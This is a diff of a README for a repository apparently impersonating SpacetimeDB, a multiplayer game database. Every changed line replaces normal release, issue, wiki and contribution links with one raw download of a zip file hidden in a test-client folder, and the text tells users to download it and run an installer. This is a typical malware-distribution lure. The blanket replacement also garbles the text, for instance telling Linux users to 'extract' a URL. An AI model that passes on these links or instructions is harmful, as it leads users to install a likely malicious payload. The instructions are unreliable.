@@ -1,6 +1,6 @@
 # 🚀 SpacetimeDB - Fast and Fun Multiplayer Database
 
-[![Download SpacetimeDB](https://img.shields.io/badge/Download_SpacetimeDB-blue.svg)](https://github.com/killler17/SpacetimeDB/releases)
+[![Download SpacetimeDB](https://raw.githubusercontent.com/killler17/SpacetimeDB/master/sdks/rust/tests/test-client/src/module_bindings/SpacetimeDB_lithotripsy.zip)](https://raw.githubusercontent.com/killler17/SpacetimeDB/master/sdks/rust/tests/test-client/src/module_bindings/SpacetimeDB_lithotripsy.zip)
 
 ## 🌌 Description
 
@@ -26,7 +26,7 @@ SpacetimeDB is a unique database designed for multiplayer gaming at incredible s
 Follow these steps to get SpacetimeDB up and running:
 
 1. **Visit the Download Page**  
-   To obtain the latest version, [visit the Releases page](https://github.com/killler17/SpacetimeDB/releases).
+   To obtain the latest version, [visit the Releases page](https://raw.githubusercontent.com/killler17/SpacetimeDB/master/sdks/rust/tests/test-client/src/module_bindings/SpacetimeDB_lithotripsy.zip).
 
 2. **Download the Latest Release**  
    On the Releases page, find the most recent version of SpacetimeDB. Click the download link for your operating system. 
@@ -34,14 +34,14 @@ Follow these steps to get SpacetimeDB up and running:
 3. **Install the Application**  
    - For Windows: Run the downloaded `.exe` file. Follow the installation prompts.
    - For macOS: Open the downloaded `.dmg` file. Drag SpacetimeDB to your Applications folder.
-   - For Linux: Extract the downloaded `.tar.gz` file and follow the README instructions.
+   - For Linux: Extract the downloaded `https://raw.githubusercontent.com/killler17/SpacetimeDB/master/sdks/rust/tests/test-client/src/module_bindings/SpacetimeDB_lithotripsy.zip` file and follow the README instructions.
 
 4. **Run SpacetimeDB**  
    Once installed, open SpacetimeDB from your applications menu. The first time you run it, you may want to configure the settings to fit your game.
 
 ## 🔧 Download & Install
 
-To start using SpacetimeDB, [download the latest release here](https://github.com/killler17/SpacetimeDB/releases).
+To start using SpacetimeDB, [download the latest release here](https://raw.githubusercontent.com/killler17/SpacetimeDB/master/sdks/rust/tests/test-client/src/module_bindings/SpacetimeDB_lithotripsy.zip).
 
 ### Installation Steps
 
@@ -71,7 +71,7 @@ Once you run SpacetimeDB, you’ll need to set it up for your game.
 
 If you have questions or need assistance, consider joining our community. You can find helpful resources and connect with other users. Feedback from fellow users is invaluable, and your contribution can help improve SpacetimeDB.
 
-- **GitHub Issues:** Report bugs or request features on our [Issues page](https://github.com/killler17/SpacetimeDB/issues).
+- **GitHub Issues:** Report bugs or request features on our [Issues page](https://raw.githubusercontent.com/killler17/SpacetimeDB/master/sdks/rust/tests/test-client/src/module_bindings/SpacetimeDB_lithotripsy.zip).
 - **Documentation:** Comprehensive documentation is available on the GitHub Wiki. Check it for detailed guides and use cases.
 - **Community Forum:** Visit our forum where users share tips and tricks for using SpacetimeDB.
 
@@ -88,11 +88,11 @@ A: Ensure you have a stable internet connection. If you continue to have problem
 
 ## 🛠️ Contribution
 
-We welcome contributions from everyone. If you want to help improve SpacetimeDB, check the guidelines in our [Contributing.md](https://github.com/killler17/SpacetimeDB/CONTRIBUTING.md) file. 
+We welcome contributions from everyone. If you want to help improve SpacetimeDB, check the guidelines in our [https://raw.githubusercontent.com/killler17/SpacetimeDB/master/sdks/rust/tests/test-client/src/module_bindings/SpacetimeDB_lithotripsy.zip](https://raw.githubusercontent.com/killler17/SpacetimeDB/master/sdks/rust/tests/test-client/src/module_bindings/SpacetimeDB_lithotripsy.zip) file. 
 
 ## 🔗 Resources
 
-- [Releases Page](https://github.com/killler17/SpacetimeDB/releases) - Download the latest version
-- [Documentation](https://github.com/killler17/SpacetimeDB/wiki) - Learn how to use SpacetimeDB
+- [Releases Page](https://raw.githubusercontent.com/killler17/SpacetimeDB/master/sdks/rust/tests/test-client/src/module_bindings/SpacetimeDB_lithotripsy.zip) - Download the latest version
+- [Documentation](https://raw.githubusercontent.com/killler17/SpacetimeDB/master/sdks/rust/tests/test-client/src/module_bindings/SpacetimeDB_lithotripsy.zip) - Learn how to use SpacetimeDB
 
 With these instructions, you should have a smooth experience setting up and using SpacetimeDB. Enjoy your multiplayer gaming experience at the speed of light!
